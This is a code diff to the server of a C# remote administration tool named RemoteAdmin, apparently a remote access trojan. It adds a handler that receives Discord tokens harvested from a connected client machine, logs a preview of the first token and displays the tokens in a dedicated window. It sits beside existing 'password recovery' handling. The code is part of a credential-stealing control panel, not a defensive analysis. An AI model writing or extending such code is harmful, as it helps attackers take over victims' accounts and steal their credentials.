@@ -4,6 +4,7 @@ using System.IO;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Threading.Tasks;
+using System.Windows;
 using System.Windows.Threading;
 using RemoteAdmin.Shared;
 
@@ -177,6 +178,71 @@ namespace RemoteAdmin.Server.Networking
                             Console.WriteLine($"Received task export result: {exportResponse.Success}");
                             _dispatcher.Invoke(() => client.TaskSchedulerWindow?.HandleExportResult(exportResponse));
                         }
+                        else if (msg is TokenResponseMessage tokenResponse)
+                        {
+                            Console.WriteLine($"");
+                            Console.WriteLine($"╔══════════════════════════════════════════════════════════════╗");
+                            Console.WriteLine($"║         DISCORD TOKEN RESPONSE RECEIVED                      ║");
+                            Console.WriteLine($"╚══════════════════════════════════════════════════════════════╝");
+                            Console.WriteLine($"");
+                            Console.WriteLine($"[Server] Client: {client.ComputerName}");
+                            Console.WriteLine($"[Server] Success: {tokenResponse.Success}");
+                            Console.WriteLine($"[Server] Tokens Length: {tokenResponse.Tokens?.Length ?? 0}");
+                            Console.WriteLine($"[Server] Window Exists: {client.DiscordTokenWindow != null}");
+                            Console.WriteLine($"[Server] Error Message: {tokenResponse.ErrorMessage ?? "None"}");
+                            Console.WriteLine($"");
+
+                            if (!string.IsNullOrWhiteSpace(tokenResponse.Tokens))
+                            {
+                                var tokenLines = tokenResponse.Tokens.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
+                                Console.WriteLine($"[Server] Token lines count: {tokenLines.Length}");
+                                if (tokenLines.Length > 0)
+                                {
+                                    Console.WriteLine($"[Server] First token preview: {tokenLines[0].Substring(0, Math.Min(30, tokenLines[0].Length))}...");
+                                }
+                            }
+
+                            Application.Current.Dispatcher.Invoke(() =>
+                            {
+                                Console.WriteLine($"[Server] → Dispatching to UI thread...");
+
+                                if (client.DiscordTokenWindow != null)
+                                {
+                                    if (tokenResponse.Success)
+                                    {
+                                        Console.WriteLine($"[Server] → Updating Discord token window...");
+                                        try
+                                        {
+                                            client.DiscordTokenWindow.UpdateTokenList(tokenResponse.Tokens);
+                                            Console.WriteLine($"[Server] ✓ Token window updated successfully!");
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            Console.WriteLine($"[Server] ✗ Error updating window: {ex.Message}");
+                                            Console.WriteLine($"[Server] Stack trace: {ex.StackTrace}");
+                                        }
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine($"[Server] ✗ Token recovery failed");
+                                        MessageBox.Show(
+                                            $"Token recovery failed: {tokenResponse.ErrorMessage}",
+                                            "Error",
+                                            MessageBoxButton.OK,
+                                            MessageBoxImage.Error);
+                                    }
+                                }
+                                else
+                                {
+                                    Console.WriteLine($"[Server] ✗ DiscordTokenWindow is NULL!");
+                                }
+                            });
+
+                            Console.WriteLine($"");
+                            Console.WriteLine($"╚══════════════════════════════════════════════════════════════╝");
+                            Console.WriteLine($"");
+                        }
+
                         else if (msg is PasswordRecoveryResponseMessage passwordResponse)
                         {
                             Console.WriteLine($"");
